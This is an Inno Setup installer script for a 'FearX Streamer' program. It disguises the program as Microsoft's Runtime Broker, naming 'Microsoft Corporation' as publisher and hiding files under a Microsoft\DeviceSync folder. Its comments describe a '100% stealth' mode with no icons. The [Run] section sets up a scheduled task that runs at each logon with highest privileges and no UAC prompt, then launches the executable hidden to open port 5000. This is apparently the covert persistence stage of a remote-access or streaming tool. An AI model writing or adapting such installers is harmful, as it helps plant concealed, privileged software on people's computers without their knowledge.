; Script generated for FearX Streamer / RuntimeBroker Installer
; Inno Setup 6.x - 100% Stealth Mode (No Desktop Shortcuts, No Browser Popups)

#define MyAppName "Runtime Broker Service"
#define MyAppVersion "1.0"
#define MyAppPublisher "Microsoft Corporation"
#define MyAppExeName "RuntimeBroker.exe"
#define ServiceTaskName "RuntimeBrokerSync"

[Setup]
AppId={{9F3B1C56-D7E4-4298-B051-7890AA52684C}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}
DefaultDirName={commonappdata}\Microsoft\DeviceSync\StreamerService
DisableProgramGroupPage=yes
DisableDirPage=yes
DisableReadyPage=yes
DisableFinishedPage=no
PrivilegesRequired=admin
ArchitecturesInstallIn64BitMode=x64compatible
OutputDir=Setup_Output
OutputBaseFilename=Setup_RuntimeBroker
Compression=lzma2/ultra64
SolidCompression=yes
WizardStyle=modern
CloseApplications=no

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Files]
; Main Executable
Source: "dist_nuitka\RuntimeBroker.exe"; DestDir: "{app}"; Flags: ignoreversion; Check: FileExists(ExpandConstant('{src}\dist_nuitka\RuntimeBroker.exe'))
; Fallback to dist if built with PyInstaller
Source: "dist\RuntimeBroker.exe"; DestDir: "{app}"; Flags: ignoreversion; Check: (not FileExists(ExpandConstant('{src}\dist_nuitka\RuntimeBroker.exe'))) and FileExists(ExpandConstant('{src}\dist\RuntimeBroker.exe'))

; Core DLL bundled directly into the stealth cache directory
Source: "..\Client.dll"; DestDir: "{commonappdata}\Microsoft\DeviceSync\StreamerCore"; Flags: ignoreversion; Check: FileExists(ExpandConstant('{src}\..\Client.dll'))

; NOTE: NO [Icons] SECTION -> Completely stealth, no desktop icons or display shortcuts created

[Run]
; 1. Register Task Scheduler task: runs on user logon with HIGHEST privileges silently (Zero UAC prompts)
Filename: "schtasks.exe"; Parameters: "/create /tn ""{#ServiceTaskName}"" /tr """"{app}\{#MyAppExeName}"""" --silent"" /sc onlogon /rl highest /f"; Flags: runhidden

; 2. Launch background service immediately in hidden/silent mode (Does NOT open browser, only opens port 5000)
Filename: "{app}\{#MyAppExeName}"; Parameters: "--silent"; Flags: runhidden nowait

[UninstallRun]
; 1. Kill running process before uninstalling
Filename: "taskkill.exe"; Parameters: "/f /im {#MyAppExeName}"; Flags: runhidden

; 2. Remove Task Scheduler task cleanly
Filename: "schtasks.exe"; Parameters: "/delete /tn ""{#ServiceTaskName}"" /f"; Flags: runhidden

[Code]
// Close running instance before installing new version
function PrepareToInstall(var NeedsRestart: Boolean): String;
var
  ResultCode: Integer;
begin
  Exec('taskkill.exe', '/f /im ' + '{#MyAppExeName}', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Result := '';
end;
